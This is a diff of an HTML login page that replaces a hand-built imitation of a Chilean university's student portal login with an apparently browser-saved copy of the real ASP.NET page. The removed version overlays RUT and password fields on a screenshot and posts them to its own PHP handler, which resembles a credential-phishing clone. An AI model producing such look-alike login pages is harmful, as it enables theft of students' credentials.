@@ -1,124 +1,1710 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <title>Acceso Zona Estudiantes - UCSH</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
+<html xmlns="http://www.w3.org/1999/xhtml" class="dxChrome dxWindowsPlatform dxWebKitFamily dxBrowserVersion-150"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Zona Estudiantes</title>
+    <link href="../css/login.css" rel="stylesheet">
+    <script src="../js/validaciones.js"></script>
+    <script>
+        function ComparaClaves(s, e) {
+            clave = txtContrasena.GetText();
+            claveConf = txtContrasena2.GetText();
+
+            if (clave != claveConf) {
+                e.isValid = false;
+                e.errorText = "Las claves ingresadas no coinciden";
+            }
         }
+        function largoClave(s, e) {
+            var clave = txtContrasena.GetText();
+            var rut = txtRut.GetValue();
+            var rutDV = txtRut.GetValue();
+            var rutCompleto = rutDV
 
-        /* Banner Superior (puedes ajustar la ruta de tu imagen de banner) */
-        .banner-container {
-            width: 100%;
-            height: 90px;
-            background-image: url('assets/img/Captura de pantalla 2026-07-27 151712.png');
-            background-repeat: no-repeat;
-            background-size: cover;
-            position: relative;
+            if (clave.length < 8) {
+                e.isValid = false;
+                e.errorText = "La Clave debe contener como minimo 8 caracteres";
+            }
+            if (clave == rut || clave == rutDV || clave == rutCompleto) {
+                e.isValid = false;
+                e.errorText = "La Clave debe ser distinta del rut";
+            }
+            if (clave == "12345678" || clave == "87654321" || clave == "01234567" || clave == "76543210" || clave == "23456789" || clave == "98765432") {
+                e.isValid = false;
+                e.errorText = "La Clave debe ser distinta de: 12345678,87654321,01234567,76543210,23456789,98765432";
+            }
         }
+        function DetectarBloqueador() {
+            var ventana = 'habilitada';
+            var popUp = window.open('', ventana, 'width=1000, height=700, left=24, top=24, scrollbars, resizable');
+            if (popUp == null || typeof (popUp) == 'undefined') {
+                alert('Las ventanas emergentes estan bloqueadas en el explorador, para un correcto funcionamiento de la zona deben estar habilitadas.');
+            } else {
+                popUp.close();
 
-        /* Contenedor de la sección central con la imagen de login de fondo */
-        .login-section {
-            width: 950px;
-            height: 520px;
-            margin: 20px auto;
-            background-image: url('assets/img/login-fondo.png'); /* Tu imagen del edificio y caja de acceso */
-            background-repeat: no-repeat;
-            background-position: center;
-            position: relative;
-            background-color: #ffffff; /* Respaldo en caso de que cargue lento */
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            }
         }
-
-        /* 
-          Capa contenedora para alinear los inputs exactamente 
-          sobre las cajas de texto blancas que se ven en la imagen de login.
-        */
-        .login-inputs-overlay {
-            position: absolute;
-            top: 360px;  /* Ajusta esta coordenada vertical si es necesario */
-            left: 575px; /* Ajusta esta coordenada horizontal si es necesario */
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            width: 160px;
+        function getIP(json) {
+            txtIP.SetText(json.ip);
         }
+    </script>
+<style></style><style></style></head>
+<body onload="DetectarBloqueador();">
+    <form method="post" action="./login.aspx?ReturnUrl=%2festudiantes%2fdatos_pers.aspx" id="form1">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTcyNTg4OTA5MA9kFgICAQ9kFgYCAQ88KwAIAQAPFgIeDl8hVXNlVmlld1N0YXRlZ2QWAmYPZBYCZg9kFgJmD2QWAgIBDzwrAAkBAA8WAh8AZ2RkAgUPPCsACAEADxYCHwBnZGQCBw88KwAIAQAPFgIfAGdkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WCAUWcG5sTWVudSRtbnVFc3R1ZGlhbnRlcwUPQVNQeFJvdW5kUGFuZWwxBRhBU1B4Um91bmRQYW5lbDEkZnJtTG9naW4FJEFTUHhSb3VuZFBhbmVsMSRmcm1Mb2dpbiRidG5JbmdyZXNhcgUKcHBjTWVuc2FqZQUPcHBjX0FjdGl2YUNsYXZlBSZwcGNfQWN0aXZhQ2xhdmUkQVNQeFZhbGlkYXRpb25TdW1tYXJ5MQUecHBjX0FjdGl2YUNsYXZlJGJ0bkFjdGl2YUNhbHZlqpNb6h1yhrWLQHGC/Ko6TnWp0JDbn8DgT9oUt3u1Klg=">
+</div>
 
-        /* Estilo de los campos de texto para que coincidan con la interfaz */
-        .login-inputs-overlay input {
-            width: 100%;
-            height: 18px;
-            padding: 2px 4px;
-            font-size: 11px;
-            border: 1px solid #7f9db9;
-            background-color: #ffffff;
-            font-family: Arial, sans-serif;
-            outline: none;
-        }
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
 
-        .login-inputs-overlay input:focus {
-            border-color: #3399ff;
-        }
 
-        /* Botón Ingresar transparente o superpuesto */
-        .btn-ingresar {
-            position: absolute;
-            top: 435px;
-            left: 615px;
-            width: 75px;
-            height: 22px;
-            background: transparent;
-            border: none;
-            cursor: pointer;
-        }
+<script src="/WebResource.axd?d=ltXxBVJPp9bUNc9kdH19ks5KLCAKYPOGzHj6pUbLjUfEbShmj2lO1SoFpiCduCcWicztERegHWakIzKSfIQmk6x1ASIVgc6CbPGw2bNmt5Y1&amp;t=638942102819057530" type="text/javascript"></script>
 
-        /* Enlace ¿olvidó su clave? */
-        .link-recuperar {
-            position: absolute;
-            top: 468px;
-            left: 560px;
-            font-size: 10px;
-            color: #003366;
-            text-decoration: none;
-        }
+<div class="aspNetHidden">
 
-        .link-recuperar:hover {
-            text-decoration: underline;
-        }
-    </style>
-</head>
-<body>
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="1806D926">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAuxnUEKAY2HbjHjnCbtlL961bODHUqmMErpwujLKCaDPA0piYeZFS6+SheeQihfRxeJikp9AAQYhjkvGo5sHqxWnNalBvw0HxZOkf5ULVV6ZXBDlDhGEJIvlyDKnSVkZS/Eg04kweFP3lusTKAYddL7e2cE7G3VtnRMFrm5LE9/Zb3XXNRx1FAIekCPXYwmDzRNpgh0ZFRlO2NMyBgM7SYUzbX8ghZ9hsowNThkAEQYT8ffiSR6iBc+yjgf0smD1OyfeRdUhIYXkF48TiQxUAv8">
+</div>
+    <div id="cont_ppal">
+        <div id="header"></div>
+        <div id="contenido">
+            <div id="mnu">
+                <script id="dxis_1039134530" src="/DXR.axd?r=1_187,1_101,1_180,1_98,1_172,1_178,1_163,1_142,1_130,1_137,1_121,1_170,1_139-FO8ck" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="/DXR.axd?r=1_14,1_16,1_1,0_275,0_279,1_7,1_8,1_6,0_105,0_107-JO8ck"><div class="dxpnlControl pnlCenter" dir="rtl" id="pnlMenu" style="background-color:#004677;padding-left:0px;padding-right:0px;padding-top:0px;padding-bottom:0px;">
+	
+                            <div class="dxmLite dxm-rtl">
+		<div class="dxm-main dxm-horizontal" id="pnlMenu_mnuEstudiantes" style="background-color: rgb(0, 70, 119); border-style: none; vertical-align: middle;">
+			<ul class="dx dxm-image-r" style="">
+				<li title="Acceso Estudiantes" class="dxm-item" style="border-style: none; border-right-color: white; border-right-width: 1px; min-width: 39px;" id="pnlMenu_mnuEstudiantes_DXI0_"><a class="dxm-content dx" href="../estudiantes/datos_pers.aspx" title="Acceso Estudiantes" style="color: white;" id="pnlMenu_mnuEstudiantes_DXI0_T"><img class="dxm-image dx-vam" src="../img/login/login.png" alt="" id="pnlMenu_mnuEstudiantes_DXI0_Img"></a></li><li class="dxm-spacing" id="pnlMenu_mnuEstudiantes_DXI0_II" style="height: 31px;"></li><li title="Ir al Home" class="dxm-item" style="background-color: rgb(0, 70, 119); border-style: none; border-right-color: white; border-right-width: 1px; min-width: 37px;" id="pnlMenu_mnuEstudiantes_DXI1_"><a class="dxm-content dx" href="../index.aspx" title="Ir al Home" style="color: white;" id="pnlMenu_mnuEstudiantes_DXI1_T"><img class="dxm-image dx-vam" src="../img/zona_estudiante/home2.gif" alt="" id="pnlMenu_mnuEstudiantes_DXI1_Img"></a></li>
+			</ul>
+		</div><b class="dx-clear"></b>
+	</div><script id="dxss_1280346417" type="text/javascript">
+<!--
+aspxAddHoverItems('pnlMenu_mnuEstudiantes',[[['dxm-hovered',''],['border-bottom-style:None;border-top-style:None;border-left-style:None;border-right-color:White;border-right-style:None;border-right-width:1px;color:#FD9705;background-color:#3399FF;',''],['DXI0_','DXI1_'],['','T']],[['dxm-scrollBtnHovered'],[''],['DXSB0_U','DXSB0_D']]]);
 
-    <!-- Banner Institucional Superior -->
-    <div class="banner-container"></div>
+var dxo = new ASPxClientMenu('pnlMenu_mnuEstudiantes');
+window['pnlMenu_mnuEstudiantes'] = dxo;
+dxo.uniqueID = 'pnlMenu$mnuEstudiantes';
+dxo.rtl = true;
+dxo.renderData={'':[[0],[1]]};
+dxo.scrollInfo=['0'];
+dxo.AfterCreate();
 
-    <!-- Sección de Login con Imagen de Fondo e Inputs Interactivos -->
-    <div class="login-section">
-        
-        <!-- Formularios interactivos posicionados exactamente encima de la imagen -->
-        <form action="procesar_login.php" method="POST">
-            
-            <div class="login-inputs-overlay">
-                <!-- Campo RUT -->
-                <input type="text" name="rut" placeholder="Ej.: 12345678" required autocomplete="off">
-                
-                <!-- Campo Clave -->
-                <input type="password" name="clave" placeholder="Ingrese su password" required>
+//-->
+</script>
+                        
+</div>
             </div>
+            <div id="left">
 
-            <!-- Botón de Ingresar clickeable -->
-            <button type="submit" class="btn-ingresar" title="Ingresar"></button>
+            </div>
+            <div id="login">
+                <div id="formulario">
+                    <table class="dxrpControl_Aqua" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1" style="width:200px;border-collapse:collapse;border-collapse:separate;">
+	<tbody><tr>
+		<td id="ASPxRoundPanel1_HC" class="dxrpHeader_Aqua dx-borderBox"><span id="ASPxRoundPanel1_RPHT" class="dxrpHT dx-vam">Acceso Zona Estudiantes</span></td>
+	</tr><tr class="dxrpCR">
+		<td id="ASPxRoundPanel1_RPC" class="dxrp dxrpcontent dx-borderBox" style="width:100%;"><div class="dxrpAW">
+			<div class="dx-borderBox dxrpCW">
+				
+                                <div class="dxflFormLayout_Aqua" id="ASPxRoundPanel1_frmLogin">
+					<table class="dxflGroup_Aqua dxflGroupSys dxflAGSys" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+						<tbody><tr>
+							<td id="ASPxRoundPanel1_frmLogin_0" class="dxflGroupCell_Aqua"><table class="dxflCLLSys dxflItemSys dxflTextEditItemSys dxflItem_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+								<tbody><tr>
+									<td class="dxflHALSys dxflVATSys dxflCaptionCell_Aqua dxflCaptionCellSys" style="width: 40px;"><label class="dxflCaption_Aqua" for="ASPxRoundPanel1_frmLogin_txtRut_I">RUT:</label><em class="dxflRequired_Aqua">*</em></td><td class="dxflNestedControlCell_Aqua">
+                                                    <input type="hidden" id="ASPxRoundPanel1_frmLogin_txtRut_Raw" name="ASPxRoundPanel1_frmLogin_txtRut_Raw" value=""><table id="ASPxRoundPanel1_frmLogin_txtRut_ET" class="dxeValidDynEditorTable dxeRoot" cellspacing="0" cellpadding="0" style="border-collapse:collapse;" errorframe="errorFrame">
+										<tbody><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtRut_CC"><table class="dxeTextBoxSys dxeTextBox dxeNullText dxh0" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtRut" style="width:170px;border-collapse:collapse;" savedspellcheck="[object Object]" spellcheck="false">
+												<tbody><tr>
+													<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys dxh0" name="ASPxRoundPanel1$frmLogin$txtRut" value="Ej.:12345678" maxlength="8" id="ASPxRoundPanel1_frmLogin_txtRut_I" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtRut')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtRut')" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtRut')" type="text" autocomplete="off" savedspellcheck="[object Object]" spellcheck="false"></td>
+												</tr>
+											</tbody></table><input type="hidden" name="ASPxRoundPanel1$frmLogin$txtRut$CVS" value=""></td>
+										</tr><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtRut_EC" class="dxeErrorCell dxeErrorFrame dxeErrorFrameSys dxeErrorCellSys dxeNoBorderTop" style="display:none;"><table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+												<tbody><tr>
+													<td><img id="ASPxRoundPanel1_frmLogin_txtRut_EI" class="dxEditors_edtError" src="/DXR.axd?r=1_19-FO8ck" alt=""></td><td id="ASPxRoundPanel1_frmLogin_txtRut_ETC" style="width:100%;white-space:nowrap;">Valor no válido</td>
+												</tr>
+											</tbody></table></td>
+										</tr>
+									<tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Sin puntos, guión y digito verificador</label></td></tr></tbody></table><script id="dxss_1539610516" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtRut',[[['dxeDisabled'],[''],['','I']]]);
+document.getElementById("ASPxRoundPanel1_frmLogin_txtRut_ET").setAttribute("errorFrame", "errorFrame");
+document.getElementById("ASPxRoundPanel1_frmLogin_txtRut_I").setAttribute("autocomplete", "off");
 
-            <!-- Enlace de recuperación -->
-            <a href="#" class="link-recuperar">¿olvidó su clave?</a>
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtRut');
+window['txtRut'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtRut';
+dxo.KeyPress.AddHandler(function(s, e) { SoloNumeros(s, e); });
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('Ingrese RUT') ];
+dxo.display = "Dynamic";
+dxo.errorImageIsAssigned = true;
+dxo.controlCellStyles = { cssClass: 'dxeErrorFrame dxeErrorFrameSys dxeNoBorderBottom dxeControlsCell', style: "" };
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.styleDecoration.AddStyle('N','dxeNullText','');
+dxo.nullText = 'Ej.:12345678';
+dxo.helpText = 'Sin puntos, gui&#243;n y digito verificador';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.errorCellPosition = 'Bottom';
+dxo.AfterCreate();
 
-        </form>
+//-->
+</script>
+                                                    
+                                                </td>
+								</tr>
+							</tbody></table></td>
+						</tr><tr>
+							<td id="ASPxRoundPanel1_frmLogin_1" class="dxflGroupCell_Aqua"><table class="dxflCLLSys dxflItemSys dxflTextEditItemSys dxflItem_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+								<tbody><tr>
+									<td class="dxflHALSys dxflVATSys dxflCaptionCell_Aqua dxflCaptionCellSys" style="width: 40px;"><label class="dxflCaption_Aqua" for="ASPxRoundPanel1_frmLogin_txtClave_I_CLND">Clave:</label><em class="dxflRequired_Aqua">*</em></td><td class="dxflNestedControlCell_Aqua">
+                                                    <input type="hidden" id="ASPxRoundPanel1_frmLogin_txtClave_Raw" name="ASPxRoundPanel1_frmLogin_txtClave_Raw" value=""><table id="ASPxRoundPanel1_frmLogin_txtClave_ET" class="dxeValidDynEditorTable dxeRoot" cellspacing="0" cellpadding="0" style="border-collapse:collapse;" errorframe="errorFrame">
+										<tbody><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtClave_CC"><table class="dxeTextBoxSys dxeTextBox dxeNullText dxh0" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtClave" style="width:170px;border-collapse:collapse;" savedspellcheck="[object Object]" spellcheck="false">
+												<tbody><tr>
+													<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys dxh0" id="ASPxRoundPanel1_frmLogin_txtClave_I" name="ASPxRoundPanel1$frmLogin$txtClave" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtClave')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtClave')" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtClave')" type="password" maxlength="10" autocomplete="off" savedspellcheck="[object Object]" spellcheck="false" saveddisplay="[object Object]" style="display: none;"><input class="dxeEditArea dxeEditAreaSys dxh0" id="ASPxRoundPanel1_frmLogin_txtClave_I_CLND" type="text" tabindex="0" saveddisplay="[object Object]" style=""></td>
+												</tr>
+											</tbody></table><input type="hidden" name="ASPxRoundPanel1$frmLogin$txtClave$CVS" value=""></td>
+										</tr><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtClave_EC" class="dxeErrorCell dxeErrorFrame dxeErrorFrameSys dxeErrorCellSys dxeNoBorderTop" style="display:none;"><table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+												<tbody><tr>
+													<td><img id="ASPxRoundPanel1_frmLogin_txtClave_EI" class="dxEditors_edtError" src="/DXR.axd?r=1_19-FO8ck" alt=""></td><td id="ASPxRoundPanel1_frmLogin_txtClave_ETC" style="width:100%;white-space:nowrap;">Valor no válido</td>
+												</tr>
+											</tbody></table></td>
+										</tr>
+									</tbody></table><script id="dxss_356747159" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtClave',[[['dxeDisabled'],[''],['','I']]]);
+document.getElementById("ASPxRoundPanel1_frmLogin_txtClave_ET").setAttribute("errorFrame", "errorFrame");
+document.getElementById("ASPxRoundPanel1_frmLogin_txtClave_I").setAttribute("autocomplete", "off");
 
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtClave');
+window['txtClave'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtClave';
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('Ingrese Clave') ];
+dxo.display = "Dynamic";
+dxo.errorImageIsAssigned = true;
+dxo.controlCellStyles = { cssClass: 'dxeErrorFrame dxeErrorFrameSys dxeNoBorderBottom dxeControlsCell', style: "" };
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.styleDecoration.AddStyle('N','dxeNullText','');
+dxo.nullText = 'Ingrese su password';
+dxo.errorCellPosition = 'Bottom';
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                </td>
+								</tr>
+							</tbody></table></td>
+						</tr><tr>
+							<td id="ASPxRoundPanel1_frmLogin_2" class="dxflHACSys dxflGroupCell_Aqua" style="width:100%;"><div class="dxflCLLSys dxflItemSys dxflButtonItemSys dxflItem_Aqua" style="width:100%;">
+								
+                                                    <table style="width:100%">
+                                                        <tbody><tr>
+                                                            <td align="center"><div class="dxbButton_Aqua dxbButtonSys dxbTSys" id="ASPxRoundPanel1_frmLogin_btnIngresar" style="-khtml-user-select:none;">
+									<div class="dxb" id="ASPxRoundPanel1_frmLogin_btnIngresar_CD">
+										<div class="dxb-hbc">
+											<input class="dxb-hb" value="Ingresar" type="submit" name="ASPxRoundPanel1$frmLogin$btnIngresar" readonly="readonly">
+										</div><span class="dx-vam">Ingresar</span>
+									</div>
+								</div><script id="dxss_1287170829" type="text/javascript">
+<!--
+aspxAddHoverItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbButtonHover_Aqua'],[''],[''],['','TC']]]);
+aspxAddPressedItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbButtonPressed_Aqua'],[''],[''],['','TC']]]);
+
+var dxo = new ASPxClientButton('ASPxRoundPanel1_frmLogin_btnIngresar');
+window['ASPxRoundPanel1_frmLogin_btnIngresar'] = dxo;
+dxo.autoPostBack = true;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$btnIngresar';
+dxo.RegisterServerEventAssigned(['Click']);
+aspxAddSelectedItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbf'],[''],['CD']]]);
+dxo.AfterCreate();
+
+//-->
+</script></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td align="left">
+                                                                <a class="dxeHyperlink" id="ASPxRoundPanel1_frmLogin_hl_Olvido" href="recuperarClave.aspx" style="color:#0066CC;font-family:Arial;font-size:11px;text-decoration:none;">¿olvido su clave?</a>
+                                                                <table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtIP" style="width:170px;border-collapse:collapse;display:none;">
+									<tbody><tr>
+										<td class="dxic" style="width: 100%; white-space: normal;"><input class="dxeEditArea dxeEditAreaSys" id="ASPxRoundPanel1_frmLogin_txtIP_I" name="ASPxRoundPanel1$frmLogin$txtIP" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtIP')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtIP')" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtIP')" type="text"></td>
+									</tr>
+								</tbody></table><script id="dxss_965717708" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtIP',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtIP');
+window['txtIP'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtIP';
+dxo.clientVisible = false;
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody></table>
+                                                        
+                                                
+							</div></td>
+						</tr>
+					</tbody></table>
+				</div><script id="dxss_1978283788" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientFormLayout('ASPxRoundPanel1_frmLogin');
+window['frmLogin'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin';
+dxo.CreateItems([['','0',,,,],['','1',,,,],['','2',,,,]]);
+dxo.AfterCreate();
+
+//-->
+</script>
+                            
+			</div>
+		</div></td>
+	</tr>
+</tbody></table>
+                </div>
+            </div>
+            
+        </div>
     </div>
+        <input type="hidden" id="ppcMensajeWS" name="ppcMensajeWS" value="0:0:-1:-10000:-10000:0:350:100:1:0:0:0"><div id="ppcMensaje_PW-1" class="dxpcLite_Aqua dxpclW" style="height:100px;width:350px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+	<div class="dxpc-mainDiv dxpc-shadow">
+		<div class="dxpc-header dxpc-withBtn" id="ppcMensaje_PWH-1">
+			<div class="dxpc-closeBtn" id="ppcMensaje_HCB-1">
+				<img class="dxWeb_pcCloseButton_Aqua" src="/DXR.axd?r=1_19-FO8ck" alt="[Cerrar]">
+			</div><div class="dxpc-headerContent">
+				<span class="dxpc-headerText dx-vam" id="ppcMensaje_PWH-1T">Login</span>
+			</div><b class="dx-clear"></b>
+		</div><div class="dxpc-contentWrapper">
+			<div class="dxpc-content" id="ppcMensaje_PWC-1">
+				
+                    <span class="dxeBase" id="ppcMensaje_txtMensaje">ASPxLabel</span>
+                
+			</div>
+		</div>
+	</div>
+</div><div id="ppcMensaje_DXPWMB-1" class="dxpcModalBackLite_Aqua" style="z-index:9999;">
 
-</body>
+</div><script id="dxss_489450871" type="text/javascript">
+<!--
+aspxAddHoverItems('ppcMensaje',[[['dxpc-closeBtnHover'],[''],['HCB-1']]]);
+
+var dxo = new ASPxClientPopupControl('ppcMensaje');
+window['ppcMensaje'] = dxo;
+dxo.popupAnimationType='fade';
+dxo.popupHorizontalAlign='WindowCenter';
+dxo.popupVerticalAlign='WindowCenter';
+dxo.isPopupPositionCorrectionOn=false;
+dxo.width=350;
+dxo.widthFromServer=true;
+dxo.height=100;
+dxo.AfterCreate();
+
+//-->
+</script>
+         <input type="hidden" id="ppc_ActivaClaveWS" name="ppc_ActivaClaveWS" value="0:0:-1:-10000:-10000:0:500:150:1:0:0:0"><div id="ppc_ActivaClave_PW-1" class="dxpcLite_Aqua dxpclW dxpc-mainDiv dxpc-shadow" style="height:150px;width:500px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+	<div class="dxpc-header dxpc-withBtn" id="ppc_ActivaClave_PWH-1">
+		<div class="dxpc-closeBtn" id="ppc_ActivaClave_HCB-1">
+			<img class="dxWeb_pcCloseButton_Aqua" src="/DXR.axd?r=1_19-FO8ck" alt="[Cerrar]">
+		</div><div class="dxpc-headerContent">
+			<span class="dxpc-headerText dx-vam" id="ppc_ActivaClave_PWH-1T">ACTIVAR CLAVE</span>
+		</div><b class="dx-clear"></b>
+	</div><div class="dxpc-contentWrapper">
+		<div class="dxpc-content" id="ppc_ActivaClave_PWC-1">
+			Estimado usuario, debe cambiar su clave asignada y completar los datos necesarios para recuperar su contraseña en caso de olvido, para continuar debe registrar todos los datos solictados.<br><span style="color:red">Te recordamos que esta es la misma clave que debes utilizar para acceder a la APP móvil.</span>
+                       <input type="hidden" id="ppc_ActivaClave_ASPxValidationSummary1_IE" name="ppc_ActivaClave_ASPxValidationSummary1_IE" value=""><table class="dxvsValidationSummary" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_ASPxValidationSummary1" style="border-collapse: collapse; display: none;">
+				<tbody><tr>
+					<td class="dxvsRC"><table class="dxvsT" cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;border-collapse:separate;">
+						<tbody>
+					</tbody></table></td>
+				</tr>
+			</tbody></table><script id="dxss_1072476935" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientValidationSummary('ppc_ActivaClave_ASPxValidationSummary1');
+window['ppc_ActivaClave_ASPxValidationSummary1'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$ASPxValidationSummary1';
+dxo.validationGroup = "ActivaClave";
+dxo.sampleErrorContainer = '<tr class="dxvsE"> <td class="dxvsETC"><a class="dxvsHL" href="javascript:;">&nbsp;</a></td></tr>';
+dxo.AfterCreate();
+
+//-->
+</script>
+                      <table>
+                           <tbody><tr>
+                               <td>Nueva Clave</td>
+                               <td>
+                                   <script id="dxss_926472333" type="text/javascript">
+<!--
+aspxAddDisabledItems('ppc_ActivaClave_txtContrasena',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtContrasena');
+window['txtContrasena'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtContrasena';
+dxo.Validation.AddHandler(function(s, e) { largoClave(s, e); });
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe ingresar clave') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.helpText = 'M&#225;ximo 10 caracteres';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.externalTableStyle=['dxeRoot', null];
+dxo.AfterCreate();
+
+//-->
+</script><table id="ppc_ActivaClave_txtContrasena_ET" cellpadding="0" cellspacing="0" class="dxeRoot"><tbody><tr><td><table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtContrasena" style="width:100px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtContrasena_I" name="ppc_ActivaClave$txtContrasena" onfocus="aspxEGotFocus('ppc_ActivaClave_txtContrasena')" onblur="aspxELostFocus('ppc_ActivaClave_txtContrasena')" onchange="aspxEValueChanged('ppc_ActivaClave_txtContrasena')" type="password" maxlength="10"></td>
+				</tr>
+			</tbody></table><input type="hidden" name="ppc_ActivaClave$txtContrasena$CVS" value=""></td></tr><tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Máximo 10 caracteres</label></td></tr></tbody></table>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Reingrese Clave</td>
+                               <td>
+                                   
+                                   <script id="dxss_519882400" type="text/javascript">
+<!--
+aspxAddDisabledItems('ppc_ActivaClave_txtContrasena2',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtContrasena2');
+window['txtContrasena2'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtContrasena2';
+dxo.Validation.AddHandler(function(s, e) { ComparaClaves(s, e); });
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe validar clave') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
